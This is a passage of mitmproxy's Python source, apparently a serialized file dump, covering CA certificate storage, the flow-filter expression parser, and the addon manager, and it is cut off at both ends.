raw = ca_file.read_bytes()\n        key = load_pem_private_key(raw, passphrase)\n        dh = cls.load_dhparam(dhparam_file)\n        certs = x509.load_pem_x509_certificates(raw)\n        ca = Cert(certs[0])\n        if len(certs) > 1:\n            chain_file: Path | None = ca_file\n        else:\n            chain_file = None\n        return cls(key, ca, chain_file, dh)\n\n    @staticmethod\n    @contextlib.contextmanager\n    def umask_secret():\n        \"\"\"\n        Context to temporarily set umask to its original value bitor 0o77.\n        Useful when writing private keys to disk so that only the owner\n        will be able to read them.\n        \"\"\"\n        original_umask = os.umask(0)\n        os.umask(original_umask | 0o77)\n        try:\n            yield\n        finally:\n            os.umask(original_umask)\n\n    @staticmethod\n    def create_store(\n        path: Path, basename: str, key_size: int, organization=None, cn=None\n    ) -> None:\n        path.mkdir(parents=True, exist_ok=True)\n\n        organization = organization or basename\n        cn = cn or basename\n\n        key: rsa.RSAPrivateKeyWithSerialization\n        ca: x509.Certificate\n        key, ca = create_ca(organization=organization, cn=cn, key_size=key_size)\n\n        # Dump the CA plus private key.\n        with CertStore.umask_secret():\n            # PEM format\n            (path / f\"{basename}-ca.pem\").write_bytes(\n                key.private_bytes(\n                    encoding=serialization.Encoding.PEM,\n                    format=serialization.PrivateFormat.TraditionalOpenSSL,\n                    encryption_algorithm=serialization.NoEncryption(),\n                )\n                + ca.public_bytes(serialization.Encoding.PEM)\n            )\n\n            # PKCS12 format for Windows devices\n            (path / f\"{basename}-ca.p12\").write_bytes(\n                pkcs12.serialize_key_and_certificates(  # type: ignore\n                    name=basename.encode(),\n                    key=key,\n                    cert=ca,\n                    cas=None,\n                    encryption_algorithm=serialization.NoEncryption(),\n                )\n            )\n\n        # Dump the certificate in PEM format\n        pem_cert = ca.public_bytes(serialization.Encoding.PEM)\n        (path / f\"{basename}-ca-cert.pem\").write_bytes(pem_cert)\n        # Create a .cer file with the same contents for Android\n        (path / f\"{basename}-ca-cert.cer\").write_bytes(pem_cert)\n\n        # Dump the certificate in PKCS12 format for Windows devices\n        (path / f\"{basename}-ca-cert.p12\").write_bytes(\n            pkcs12.serialize_key_and_certificates(\n                name=basename.encode(),\n                key=None,  # type: ignore\n                cert=ca,\n                cas=None,\n                encryption_algorithm=serialization.NoEncryption(),\n            )\n        )\n\n        (path / f\"{basename}-dhparam.pem\").write_bytes(DEFAULT_DHPARAM)\n\n    def add_cert_file(\n        self, spec: str, path: Path, passphrase: bytes | None = None\n    ) -> None:\n        raw = path.read_bytes()\n        cert = Cert.from_pem(raw)\n        try:\n            key = load_pem_private_key(raw, password=passphrase)\n        except ValueError:\n            key = self.default_privatekey\n\n        self.add_cert(CertStoreEntry(cert, key, path, [cert]), spec)\n\n    def add_cert(self, entry: CertStoreEntry, *names: str) -> None:\n        \"\"\"\n        Adds a cert to the certstore. We register the CN in the cert plus\n        any SANs, and also the list of names provided as an argument.\n        \"\"\"\n        if entry.cert.cn:\n            self.certs[entry.cert.cn] = entry\n        for i in entry.cert.altnames:\n            self.certs[str(i.value)] = entry\n        for i in names:\n            self.certs[i] = entry\n\n    @staticmethod\n    def asterisk_forms(dn: str | x509.GeneralName) -> list[str]:\n        \"\"\"\n        Return all asterisk forms for a domain. For example, for www.example.com this will return\n        [b\"www.example.com\", b\"*.example.com\", b\"*.com\"]. The single wildcard \"*\" is omitted.\n        \"\"\"\n        if isinstance(dn, str):\n            parts = dn.split(\".\")\n            ret = [dn]\n            for i in range(1, len(parts)):\n                ret.append(\"*.\" + \".\".join(parts[i:]))\n            return ret\n        elif isinstance(dn, x509.DNSName):\n            return CertStore.asterisk_forms(dn.value)\n        else:\n            return [str(dn.value)]\n\n    def get_cert(\n        self,\n        commonname: str | None,\n        sans: Iterable[x509.GeneralName],\n        organization: str | None = None,\n    ) -> CertStoreEntry:\n        \"\"\"\n        commonname: Common name for the generated certificate. Must be a\n        valid, plain-ASCII, IDNA-encoded domain name.\n\n        sans: A list of Subject Alternate Names.\n\n        organization: Organization name for the generated certificate.\n        \"\"\"\n        sans = _fix_legacy_sans(sans)\n\n        potential_keys: list[TCertId] = []\n        if commonname:\n            potential_keys.extend(self.asterisk_forms(commonname))\n        for s in sans:\n            potential_keys.extend(self.asterisk_forms(s))\n        potential_keys.append(\"*\")\n        potential_keys.append((commonname, sans))\n\n        name = next(filter(lambda key: key in self.certs, potential_keys), None)\n        if name:\n            entry = self.certs[name]\n        else:\n            entry = CertStoreEntry(\n                cert=dummy_cert(\n                    self.default_privatekey,\n                    self.default_ca._cert,\n                    commonname,\n                    sans,\n                    organization,\n                ),\n                privatekey=self.default_privatekey,\n                chain_file=self.default_chain_file,\n                chain_certs=self.default_chain_certs,\n            )\n            self.certs[(commonname, sans)] = entry\n            self.expire(entry)\n\n        return entry\n\n\ndef load_pem_private_key(data: bytes, password: bytes | None) -> rsa.RSAPrivateKey:\n    \"\"\"\n    like cryptography's load_pem_private_key, but silently falls back to not using a password\n    if the private key is unencrypted.\n    \"\"\"\n    try:\n        return serialization.load_pem_private_key(data, password)  # type: ignore\n    except TypeError:\n        if password is not None:\n            return load_pem_private_key(data, None)\n        raise\n", "mitmproxy/flowfilter.py": "\"\"\"\nThe following operators are understood:\n\n    ~q          Request\n    ~s          Response\n\nHeaders:\n\n    Patterns are matched against \"name: value\" strings. Field names are\n    all-lowercase.\n\n    ~a          Asset content-type in response. Asset content types are:\n                    text/javascript\n                    application/x-javascript\n                    application/javascript\n                    text/css\n                    image/*\n                    font/*\n                    application/font-*\n    ~h rex      Header line in either request or response\n    ~hq rex     Header in request\n    ~hs rex     Header in response\n\n    ~b rex      Expression in the body of either request or response\n    ~bq rex     Expression in the body of request\n    ~bs rex     Expression in the body of response\n    ~t rex      Shortcut for content-type header.\n\n    ~d rex      Request domain\n    ~m rex      Method\n    ~u rex      URL\n    ~c CODE     Response code.\n    rex         Equivalent to ~u rex\n\"\"\"\n\nimport functools\nimport re\nimport sys\nfrom collections.abc import Sequence\nfrom typing import ClassVar\nfrom typing import Protocol\n\nimport pyparsing as pp\n\nfrom mitmproxy import dns\nfrom mitmproxy import flow\nfrom mitmproxy import http\nfrom mitmproxy import tcp\nfrom mitmproxy import udp\n\n\ndef only(*types):\n    def decorator(fn):\n        @functools.wraps(fn)\n        def filter_types(self, flow):\n            if isinstance(flow, types):\n                return fn(self, flow)\n            return False\n\n        return filter_types\n\n    return decorator\n\n\nclass _Token:\n    def dump(self, indent=0, fp=sys.stdout):\n        print(\n            \"{spacing}{name}{expr}\".format(\n                spacing=\"\\t\" * indent,\n                name=self.__class__.__name__,\n                expr=getattr(self, \"expr\", \"\"),\n            ),\n            file=fp,\n        )\n\n\nclass _Action(_Token):\n    code: ClassVar[str]\n    help: ClassVar[str]\n\n    @classmethod\n    def make(klass, s, loc, toks):\n        return klass(*toks[1:])\n\n\nclass FErr(_Action):\n    code = \"e\"\n    help = \"Match error\"\n\n    def __call__(self, f):\n        return True if f.error else False\n\n\nclass FMarked(_Action):\n    code = \"marked\"\n    help = \"Match marked flows\"\n\n    def __call__(self, f):\n        return bool(f.marked)\n\n\nclass FHTTP(_Action):\n    code = \"http\"\n    help = \"Match HTTP flows\"\n\n    @only(http.HTTPFlow)\n    def __call__(self, f):\n        return True\n\n\nclass FWebSocket(_Action):\n    code = \"websocket\"\n    help = \"Match WebSocket flows\"\n\n    @only(http.HTTPFlow)\n    def __call__(self, f: http.HTTPFlow):\n        return f.websocket is not None\n\n\nclass FTCP(_Action):\n    code = \"tcp\"\n    help = \"Match TCP flows\"\n\n    @only(tcp.TCPFlow)\n    def __call__(self, f):\n        return True\n\n\nclass FUDP(_Action):\n    code = \"udp\"\n    help = \"Match UDP flows\"\n\n    @only(udp.UDPFlow)\n    def __call__(self, f):\n        return True\n\n\nclass FDNS(_Action):\n    code = \"dns\"\n    help = \"Match DNS flows\"\n\n    @only(dns.DNSFlow)\n    def __call__(self, f):\n        return True\n\n\nclass FReq(_Action):\n    code = \"q\"\n    help = \"Match request with no response\"\n\n    @only(http.HTTPFlow, dns.DNSFlow)\n    def __call__(self, f):\n        if not f.response:\n            return True\n\n\nclass FResp(_Action):\n    code = \"s\"\n    help = \"Match response\"\n\n    @only(http.HTTPFlow, dns.DNSFlow)\n    def __call__(self, f):\n        return bool(f.response)\n\n\nclass FAll(_Action):\n    code = \"all\"\n    help = \"Match all flows\"\n\n    def __call__(self, f: flow.Flow):\n        return True\n\n\nclass _Rex(_Action):\n    flags = 0\n    is_binary = True\n\n    def __init__(self, expr):\n        self.expr = expr\n        if self.is_binary:\n            expr = expr.encode()\n        try:\n            self.re = re.compile(expr, self.flags)\n        except Exception:\n            raise ValueError(\"Cannot compile expression.\")\n\n\ndef _check_content_type(rex, message):\n    return any(\n        name.lower() == b\"content-type\" and rex.search(value)\n        for name, value in message.headers.fields\n    )\n\n\nclass FAsset(_Action):\n    code = \"a\"\n    help = \"Match asset in response: CSS, JavaScript, images, fonts.\"\n    ASSET_TYPES = [\n        re.compile(x)\n        for x in [\n            b\"text/javascript\",\n            b\"application/x-javascript\",\n            b\"application/javascript\",\n            b\"text/css\",\n            b\"image/.*\",\n            b\"font/.*\",\n            b\"application/font.*\",\n        ]\n    ]\n\n    @only(http.HTTPFlow)\n    def __call__(self, f):\n        if f.response:\n            for i in self.ASSET_TYPES:\n                if _check_content_type(i, f.response):\n                    return True\n        return False\n\n\nclass FContentType(_Rex):\n    code = \"t\"\n    help = \"Content-type header\"\n\n    @only(http.HTTPFlow)\n    def __call__(self, f):\n        if _check_content_type(self.re, f.request):\n            return True\n        elif f.response and _check_content_type(self.re, f.response):\n            return True\n        return False\n\n\nclass FContentTypeRequest(_Rex):\n    code = \"tq\"\n    help = \"Request Content-Type header\"\n\n    @only(http.HTTPFlow)\n    def __call__(self, f):\n        return _check_content_type(self.re, f.request)\n\n\nclass FContentTypeResponse(_Rex):\n    code = \"ts\"\n    help = \"Response Content-Type header\"\n\n    @only(http.HTTPFlow)\n    def __call__(self, f):\n        if f.response:\n            return _check_content_type(self.re, f.response)\n        return False\n\n\nclass FHead(_Rex):\n    code = \"h\"\n    help = \"Header\"\n    flags = re.MULTILINE\n\n    @only(http.HTTPFlow)\n    def __call__(self, f):\n        if f.request and self.re.search(bytes(f.request.headers)):\n            return True\n        if f.response and self.re.search(bytes(f.response.headers)):\n            return True\n        return False\n\n\nclass FHeadRequest(_Rex):\n    code = \"hq\"\n    help = \"Request header\"\n    flags = re.MULTILINE\n\n    @only(http.HTTPFlow)\n    def __call__(self, f):\n        if f.request and self.re.search(bytes(f.request.headers)):\n            return True\n\n\nclass FHeadResponse(_Rex):\n    code = \"hs\"\n    help = \"Response header\"\n    flags = re.MULTILINE\n\n    @only(http.HTTPFlow)\n    def __call__(self, f):\n        if f.response and self.re.search(bytes(f.response.headers)):\n            return True\n\n\nclass FBod(_Rex):\n    code = \"b\"\n    help = \"Body\"\n    flags = re.DOTALL\n\n    @only(http.HTTPFlow, tcp.TCPFlow, udp.UDPFlow, dns.DNSFlow)\n    def __call__(self, f):\n        if isinstance(f, http.HTTPFlow):\n            if (\n                f.request\n                and (content := f.request.get_content(strict=False)) is not None\n            ):\n                if self.re.search(content):\n                    return True\n            if (\n                f.response\n                and (content := f.response.get_content(strict=False)) is not None\n            ):\n                if self.re.search(content):\n                    return True\n            if f.websocket:\n                for wmsg in f.websocket.messages:\n                    if wmsg.content is not None and self.re.search(wmsg.content):\n                        return True\n        elif isinstance(f, (tcp.TCPFlow, udp.UDPFlow)):\n            for msg in f.messages:\n                if msg.content is not None and self.re.search(msg.content):\n                    return True\n        elif isinstance(f, dns.DNSFlow):\n            if f.request and self.re.search(f.request.content):\n                return True\n            if f.response and self.re.search(f.response.content):\n                return True\n        return False\n\n\nclass FBodRequest(_Rex):\n    code = \"bq\"\n    help = \"Request body\"\n    flags = re.DOTALL\n\n    @only(http.HTTPFlow, tcp.TCPFlow, udp.UDPFlow, dns.DNSFlow)\n    def __call__(self, f):\n        if isinstance(f, http.HTTPFlow):\n            if (\n                f.request\n                and (content := f.request.get_content(strict=False)) is not None\n            ):\n                if self.re.search(content):\n                    return True\n            if f.websocket:\n                for wmsg in f.websocket.messages:\n                    if wmsg.from_client and self.re.search(wmsg.content):\n                        return True\n        elif isinstance(f, (tcp.TCPFlow, udp.UDPFlow)):\n            for msg in f.messages:\n                if msg.from_client and self.re.search(msg.content):\n                    return True\n        elif isinstance(f, dns.DNSFlow):\n            if f.request and self.re.search(f.request.content):\n                return True\n\n\nclass FBodResponse(_Rex):\n    code = \"bs\"\n    help = \"Response body\"\n    flags = re.DOTALL\n\n    @only(http.HTTPFlow, tcp.TCPFlow, udp.UDPFlow, dns.DNSFlow)\n    def __call__(self, f):\n        if isinstance(f, http.HTTPFlow):\n            if (\n                f.response\n                and (content := f.response.get_content(strict=False)) is not None\n            ):\n                if self.re.search(content):\n                    return True\n            if f.websocket:\n                for wmsg in f.websocket.messages:\n                    if not wmsg.from_client and self.re.search(wmsg.content):\n                        return True\n        elif isinstance(f, (tcp.TCPFlow, udp.UDPFlow)):\n            for msg in f.messages:\n                if not msg.from_client and self.re.search(msg.content):\n                    return True\n        elif isinstance(f, dns.DNSFlow):\n            if f.response and self.re.search(f.response.content):\n                return True\n\n\nclass FMethod(_Rex):\n    code = \"m\"\n    help = \"Method\"\n    flags = re.IGNORECASE\n\n    @only(http.HTTPFlow)\n    def __call__(self, f):\n        return bool(self.re.search(f.request.data.method))\n\n\nclass FDomain(_Rex):\n    code = \"d\"\n    help = \"Domain\"\n    flags = re.IGNORECASE\n    is_binary = False\n\n    @only(http.HTTPFlow)\n    def __call__(self, f):\n        return bool(\n            self.re.search(f.request.host) or self.re.search(f.request.pretty_host)\n        )\n\n\nclass FUrl(_Rex):\n    code = \"u\"\n    help = \"URL\"\n    is_binary = False\n    flags = re.IGNORECASE\n\n    # FUrl is special, because it can be \"naked\".\n\n    @classmethod\n    def make(klass, s, loc, toks):\n        if len(toks) > 1:\n            toks = toks[1:]\n        return klass(*toks)\n\n    @only(http.HTTPFlow, dns.DNSFlow)\n    def __call__(self, f):\n        if not f or not f.request:\n            return False\n        if isinstance(f, http.HTTPFlow):\n            return self.re.search(f.request.pretty_url)\n        elif isinstance(f, dns.DNSFlow):\n            return f.request.questions and self.re.search(f.request.questions[0].name)\n\n\nclass FSrc(_Rex):\n    code = \"src\"\n    help = \"Match source address\"\n    is_binary = False\n\n    def __call__(self, f):\n        if not f.client_conn or not f.client_conn.peername:\n            return False\n        r = f\"{f.client_conn.peername[0]}:{f.client_conn.peername[1]}\"\n        return f.client_conn.peername and self.re.search(r)\n\n\nclass FDst(_Rex):\n    code = \"dst\"\n    help = \"Match destination address\"\n    is_binary = False\n\n    def __call__(self, f):\n        if not f.server_conn or not f.server_conn.address:\n            return False\n        r = f\"{f.server_conn.address[0]}:{f.server_conn.address[1]}\"\n        return f.server_conn.address and self.re.search(r)\n\n\nclass FReplay(_Action):\n    code = \"replay\"\n    help = \"Match replayed flows\"\n\n    def __call__(self, f):\n        return f.is_replay is not None\n\n\nclass FReplayClient(_Action):\n    code = \"replayq\"\n    help = \"Match replayed client request\"\n\n    def __call__(self, f):\n        return f.is_replay == \"request\"\n\n\nclass FReplayServer(_Action):\n    code = \"replays\"\n    help = \"Match replayed server response\"\n\n    def __call__(self, f):\n        return f.is_replay == \"response\"\n\n\nclass FMeta(_Rex):\n    code = \"meta\"\n    help = \"Flow metadata\"\n    flags = re.MULTILINE\n    is_binary = False\n\n    def __call__(self, f):\n        m = \"\\n\".join([f\"{key}: {value}\" for key, value in f.metadata.items()])\n        return self.re.search(m)\n\n\nclass FMarker(_Rex):\n    code = \"marker\"\n    help = \"Match marked flows with specified marker\"\n    is_binary = False\n\n    def __call__(self, f):\n        return self.re.search(f.marked)\n\n\nclass FComment(_Rex):\n    code = \"comment\"\n    help = \"Flow comment\"\n    flags = re.MULTILINE\n    is_binary = False\n\n    def __call__(self, f):\n        return self.re.search(f.comment)\n\n\nclass _Int(_Action):\n    def __init__(self, num):\n        self.num = int(num)\n\n\nclass FCode(_Int):\n    code = \"c\"\n    help = \"HTTP response code\"\n\n    @only(http.HTTPFlow)\n    def __call__(self, f):\n        if f.response and f.response.status_code == self.num:\n            return True\n\n\nclass FAnd(_Token):\n    def __init__(self, lst):\n        self.lst = lst\n\n    def dump(self, indent=0, fp=sys.stdout):\n        super().dump(indent, fp)\n        for i in self.lst:\n            i.dump(indent + 1, fp)\n\n    def __call__(self, f):\n        return all(i(f) for i in self.lst)\n\n\nclass FOr(_Token):\n    def __init__(self, lst):\n        self.lst = lst\n\n    def dump(self, indent=0, fp=sys.stdout):\n        super().dump(indent, fp)\n        for i in self.lst:\n            i.dump(indent + 1, fp)\n\n    def __call__(self, f):\n        return any(i(f) for i in self.lst)\n\n\nclass FNot(_Token):\n    def __init__(self, itm):\n        self.itm = itm[0]\n\n    def dump(self, indent=0, fp=sys.stdout):\n        super().dump(indent, fp)\n        self.itm.dump(indent + 1, fp)\n\n    def __call__(self, f):\n        return not self.itm(f)\n\n\nfilter_unary: Sequence[type[_Action]] = [\n    FAsset,\n    FErr,\n    FHTTP,\n    FMarked,\n    FReplay,\n    FReplayClient,\n    FReplayServer,\n    FReq,\n    FResp,\n    FTCP,\n    FUDP,\n    FDNS,\n    FWebSocket,\n    FAll,\n]\nfilter_rex: Sequence[type[_Rex]] = [\n    FBod,\n    FBodRequest,\n    FBodResponse,\n    FContentType,\n    FContentTypeRequest,\n    FContentTypeResponse,\n    FDomain,\n    FDst,\n    FHead,\n    FHeadRequest,\n    FHeadResponse,\n    FMethod,\n    FSrc,\n    FUrl,\n    FMeta,\n    FMarker,\n    FComment,\n]\nfilter_int = [FCode]\n\n\ndef _make():\n    # Order is important - multi-char expressions need to come before narrow\n    # ones.\n    parts = []\n    for cls in filter_unary:\n        f = pp.Literal(f\"~{cls.code}\") + pp.WordEnd()\n        f.setParseAction(cls.make)\n        parts.append(f)\n\n    # This is a bit of a hack to simulate Word(pyparsing_unicode.printables),\n    # which has a horrible performance with len(pyparsing.pyparsing_unicode.printables) == 1114060\n    unicode_words = pp.CharsNotIn(\"()~'\\\"\" + pp.ParserElement.DEFAULT_WHITE_CHARS)\n    unicode_words.skipWhitespace = True\n    regex = (\n        unicode_words\n        | pp.QuotedString('\"', escChar=\"\\\\\")\n        | pp.QuotedString(\"'\", escChar=\"\\\\\")\n    )\n    for cls in filter_rex:\n        f = pp.Literal(f\"~{cls.code}\") + pp.WordEnd() + regex.copy()\n        f.setParseAction(cls.make)\n        parts.append(f)\n\n    for cls in filter_int:\n        f = pp.Literal(f\"~{cls.code}\") + pp.WordEnd() + pp.Word(pp.nums)\n        f.setParseAction(cls.make)\n        parts.append(f)\n\n    # A naked rex is a URL rex:\n    f = regex.copy()\n    f.setParseAction(FUrl.make)\n    parts.append(f)\n\n    atom = pp.MatchFirst(parts)\n    expr = pp.infixNotation(\n        atom,\n        [\n            (pp.Literal(\"!\").suppress(), 1, pp.opAssoc.RIGHT, lambda x: FNot(*x)),\n            (pp.Literal(\"&\").suppress(), 2, pp.opAssoc.LEFT, lambda x: FAnd(*x)),\n            (pp.Literal(\"|\").suppress(), 2, pp.opAssoc.LEFT, lambda x: FOr(*x)),\n        ],\n    )\n    expr = pp.OneOrMore(expr)\n    return expr.setParseAction(lambda x: FAnd(x) if len(x) != 1 else x)\n\n\nbnf = _make()\n\n\nclass TFilter(Protocol):\n    pattern: str\n\n    def __call__(self, f: flow.Flow) -> bool: ...  # pragma: no cover\n\n\ndef parse(s: str) -> TFilter:\n    \"\"\"\n    Parse a filter expression and return the compiled filter function.\n    If the filter syntax is invalid, `ValueError` is raised.\n    \"\"\"\n    if not s:\n        raise ValueError(\"Empty filter expression\")\n    try:\n        flt = bnf.parseString(s, parseAll=True)[0]\n        flt.pattern = s\n        return flt\n    except (pp.ParseException, ValueError) as e:\n        raise ValueError(f\"Invalid filter expression: {s!r}\") from e\n\n\ndef match(flt: str | TFilter, flow: flow.Flow) -> bool:\n    \"\"\"\n    Matches a flow against a compiled filter expression.\n    Returns True if matched, False if not.\n\n    If flt is a string, it will be compiled as a filter expression.\n    If the expression is invalid, ValueError is raised.\n    \"\"\"\n    if isinstance(flt, str):\n        flt = parse(flt)\n    if flt:\n        return flt(flow)\n    return True\n\n\nmatch_all: TFilter = parse(\"~all\")\n\"\"\"A filter function that matches all flows\"\"\"\n\n\nhelp = []\nfor a in filter_unary:\n    help.append((f\"~{a.code}\", a.help))\nfor b in filter_rex:\n    help.append((f\"~{b.code} regex\", b.help))\nfor c in filter_int:\n    help.append((f\"~{c.code} int\", c.help))\nhelp.sort()\nhelp.extend(\n    [\n        (\"!\", \"unary not\"),\n        (\"&\", \"and\"),\n        (\"|\", \"or\"),\n        (\"(...)\", \"grouping\"),\n    ]\n)\n", "mitmproxy/addonmanager.py": "import contextlib\nimport inspect\nimport logging\nimport pprint\nimport sys\nimport traceback\nimport types\nfrom collections.abc import Callable\nfrom collections.abc import Sequence\nfrom dataclasses import dataclass\nfrom typing import Any\n\nfrom mitmproxy import exceptions\nfrom mitmproxy import flow\nfrom mitmproxy import hooks\n\nlogger = logging.getLogger(__name__)\n\n\ndef _get_name(itm):\n    return getattr(itm, \"name\", itm.__class__.__name__.lower())\n\n\ndef cut_traceback(tb, func_name):\n    \"\"\"\n    Cut off a traceback at the function with the given name.\n    The func_name's frame is excluded.\n\n    Args:\n        tb: traceback object, as returned by sys.exc_info()[2]\n        func_name: function name\n\n    Returns:\n        Reduced traceback.\n    \"\"\"\n    tb_orig = tb\n    for _, _, fname, _ in traceback.extract_tb(tb):\n        tb = tb.tb_next\n        if fname == func_name:\n            break\n    return tb or tb_orig\n\n\n@contextlib.contextmanager\ndef safecall():\n    try:\n        yield\n    except (exceptions.AddonHalt, exceptions.OptionsError):\n        raise\n    except Exception:\n        etype, value, tb = sys.exc_info()\n        tb = cut_traceback(tb, \"invoke_addon_sync\")\n        tb = cut_traceback(tb, \"invoke_addon\")\n        assert etype\n        assert value\n        logger.error(\n            f\"Addon error: {value}\",\n            exc_info=(etype, value, tb),\n        )\n\n\nclass Loader:\n    \"\"\"\n    A loader object is passed to the load() event when addons start up.\n    \"\"\"\n\n    def __init__(self, master):\n        self.master = master\n\n    def add_option(\n        self,\n        name: str,\n        typespec: type,\n        default: Any,\n        help: str,\n        choices: Sequence[str] | None = None,\n    ) -> None:\n        \"\"\"\n        Add an option to mitmproxy.\n\n        Help should be a single paragraph with no linebreaks - it will be\n        reflowed by tools. Information on the data type should be omitted -\n        it will be generated and added by tools as needed.\n        \"\"\"\n        assert not isinstance(choices, str)\n        if name in self.master.options:\n            existing = self.master.options._options[name]\n            same_signature = (\n                existing.name == name\n                and existing.typespec == typespec\n                and existing.default == default\n                and existing.help == help\n                and existing.choices == choices\n            )\n            if same_signature:\n                return\n            else:\n                logger.warning(\"Over-riding existing option %s\" % name)\n        self.master.options.add_option(name, typespec, default, help, choices)\n\n    def add_command(self, path: str, func: Callable) -> None:\n        \"\"\"Add a command to mitmproxy.\n\n        Unless you are generating commands programatically,\n        this API should be avoided. Decorate your function with `@mitmproxy.command.command` instead.\n        \"\"\"\n        self.master.commands.add(path, func)\n\n\ndef traverse(chain):\n    \"\"\"\n    Recursively traverse an addon chain.\n    \"\"\"\n    for a in chain:\n        yield a\n        if hasattr(a, \"addons\"):\n            yield from traverse(a.addons)\n\n\n@dataclass\nclass LoadHook(hooks.Hook):\n    \"\"\"\n    Called when an addon is first loaded. This event receives a Loader\n    object, which contains methods for adding options and commands. This\n    method is where the addon configures itself.\n    \"\"\"\n\n    loader: Loader\n\n\nclass AddonManager:\n    def __init__(self, master):\n        self.lookup = {}\n        self.chain = []\n        self.master = master\n        master.options.changed.connect(self._configure_all)\n\n    def _configure_all(self, updated):\n        self.trigger(hooks.ConfigureHook(updated))\n\n    def clear(self):\n        \"\"\"\n        Remove all addons.\n        \"\"\"\n        for a in self.chain:\n            self.invoke_addon_sync(a, hooks.DoneHook())\n        self.lookup = {}\n        self.chain = []\n\n    def get(self, name):\n        \"\"\"\n        Retrieve an addon by name. Addon names are equal to the .name\n        attribute on the instance, or the lower case class name if that\n        does not exist.\n        \"\"\"\n        return self.lookup.get(name, None)\n\n    def register(self, addon):\n        \"\"\"\n        Register an addon, call its load event, and then register all its\n        sub-addons. This should be used by addons that dynamically manage\n        addons.\n\n        If the calling addon is already running, it should follow with\n        running and configure events. Must be called within a current\n        context.\n        \"\"\"\n        api_changes = {\n            # mitmproxy 6 -> mitmproxy 7\n            \"clientconnect\": f\"The clientconnect event has been removed, use client_connected instead\",\n            \"clientdisconnect\": f\"The clientdisconnect event has been removed, use client_disconnected instead\",\n            \"serverconnect\": \"The serverconnect event has been removed, use server_connect and server_connected instead\",\n            \"serverdisconnect\": f\"The serverdisconnect event has been removed, use server_disconnected instead\",\n            # mitmproxy 8 -> mitmproxy 9\n            \"add_log\": \"The add_log event has been deprecated, use Python's builtin logging module instead\",\n        }\n        for a in traverse([addon]):\n            for old, msg in api_changes.items():\n                if hasattr(a, old):\n                    logger.warning(\n                        f\"{msg}. For more details, see https://docs.mitmproxy.org/dev/addons-api-changelog/.\"\n                    )\n            name = _get_name(a)\n            if name in self.lookup:\n                raise exceptions.AddonManagerError(\n                    \"An addon called '%s' already exists.\" % name\n                )\n        loader = Loader(self.master)\n        self.invoke_addon_sync(addon, LoadHook(loader))\n        for a in traverse([addon]):\n            name = _get_name(a)\n            self.lookup[name] = a\n        for a in traverse([addon]):\n            self.master.commands.collect_commands(a)\n        self.master.options.process_deferred()\n        return addon\n\n    def add(self, *addons):\n        \"\"\"\n        Add addons to the end of the chain, and run their load event.\n        If any addon has sub-addons, they are registered.\n        \"\"\"\n        for i in addons:\n            self.chain.append(self.register(i))\n\n    def remove(self, addon):\n        \"\"\"\n        Remove an addon and all its sub-addons.\n\n        If the addon is not in the chain - that is, if it's managed by a\n        parent addon - it's the parent's responsibility to remove it from\n        its own addons attribute.\n        \"\"\"\n        for a in traverse([addon]):\n            n = _get_name(a)\n            if n not in self.lookup:\n                raise exceptions.AddonManagerError(\"No such addon: %s\" % n)\n            self.chain = [i for i in self.chain if i is not a]\n            del self.lookup[_get_name(a)]\n        self.invoke_addon_sync(addon, hooks.DoneHook())\n\n    def __len__(self):\n        return len(self.chain)\n\n    def __str__(self):\n        return pprint.pformat([str(i) for i in self.chain])\n\n    def __contains__(self, item):\n        name = _get_name(item)\n        return name in self.lookup\n\n    async def handle_lifecycle(self, event: hooks.Hook):\n        \"\"\"\n        Handle a lifecycle event.\n        \"\"\"\n        message = event.args()[0]\n\n        await self.trigger_event(event)\n\n        if isinstance(message, flow.Flow):\n            await self.trigger_event(hooks.UpdateHook([message]))\n\n    def _iter_hooks(self, addon, event: hooks.Hook):\n        \"\"\"\n        Enumerate all hook callables belonging to the given addon\n        \"\"\"\n        assert isinstance(event, hooks.Hook)\n        for a in traverse([addon]):\n            func = getattr(a, event.name, None)\n            if func:\n                if callable(func):\n                    yield a, func\n                elif isinstance(func, types.ModuleType):\n                    # we gracefully exclude module imports with the same name as hooks.\n                    # For example, a user may have \"from mitmproxy import log\" in an addon,\n                    # which has the same name as the \"log\" hook. In this particular case,\n                    # we end up in an error loop because we \"log\" this error.\n                    pass\n                else:\n                    raise exceptions.AddonManagerError(\n                        f\"Addon handler {event.name} ({a}) not callable\"\n                    )\n\n    async def invoke_addon(self, addon, event: hooks.Hook):\n        \"\"\"\n        Asynchronously invoke an event on an addon and all its children.\n        \"\"\"\n        for addon, func in self._iter_hooks(addon, event):\n            res = func(*event.args())\n            # Support both async and sync hook functions\n            if res is not None and inspect.isawaitable(res):\n                await res\n\n    def invoke_addon_sync(self, addon, event: hooks.Hook):\n        \"\"\"\n        Invoke an event on an addon and all its children.\n        \"\"\"\n        for addon, func in self._iter_hooks(addon, event):\n            if inspect.iscoroutinefunction(func):\n                raise exceptions.AddonManagerError(\n                    f\"Async handler {event.name} ({addon}) cannot be called from sync context\"\n                )\n            func(*event.args())\n\n    async def trigger_event(self, event: hooks.Hook):\n        \"\"\"\n        Asynchronously trigger an event across all addons.\n        \"\"\"\n        for i in self.chain:\n            try:\n                with safecall():\n                    await self.invoke_addon(i, event)\n            except exceptions.AddonHalt:\n                return\n\n    def trigger(self, event: hooks.Hook):\n        \"\"\"\n        Trigger an event across all addons.\n\n        This API is discouraged and may be deprecated in the future.\n        Use `trigger_event()` instead, which provides the same functionality but supports async hooks.\n        \"\"\"\n        for i in self.chain:\n            try:\n                with safecall():\n                    self.invoke_addon_sync(i, event)\n            except exceptions.AddonHalt:\n                return\n", "mitmproxy/ctx.py": "from __future__ import annotations\n\nimport typing\n\nif typing.TYPE_CHECKING:\n    import mitmproxy.log\n    import mitmproxy.master\n    import mitmproxy.options\n\nmaster: mitmproxy.master.Master\noptions: mitmproxy.options.Options\n\nlog: mitmproxy.log.Log\n\"\"\"Deprecated: Use Python's builtin `logging` module instead.\"\"\"\n", "mitmproxy/version.py": "import os\nimport subprocess\nimport sys\n\nVERSION = \"11.0.0.dev\"\nMITMPROXY = \"mitmproxy \" + VERSION\n\n# Serialization format version. This is displayed nowhere, it just needs to be incremented by one\n# for each change in the file format.\nFLOW_FORMAT_VERSION = 20\n\n\ndef get_dev_version() -> str:\n    \"\"\"\n    Return a detailed version string, sourced either from VERSION or obtained dynamically using git.\n    \"\"\"\n\n    mitmproxy_version = VERSION\n\n    here = os.path.abspath(os.path.join(os.path.dirname(__file__), \"..\"))\n    try:  # pragma: no cover\n        # Check that we're in the mitmproxy repository: https://github.com/mitmproxy/mitmproxy/issues/3987\n        # cb0e3287090786fad566feb67ac07b8ef361b2c3 is the first mitmproxy commit.\n        subprocess.run(\n            [\"git\", \"cat-file\", \"-e\", 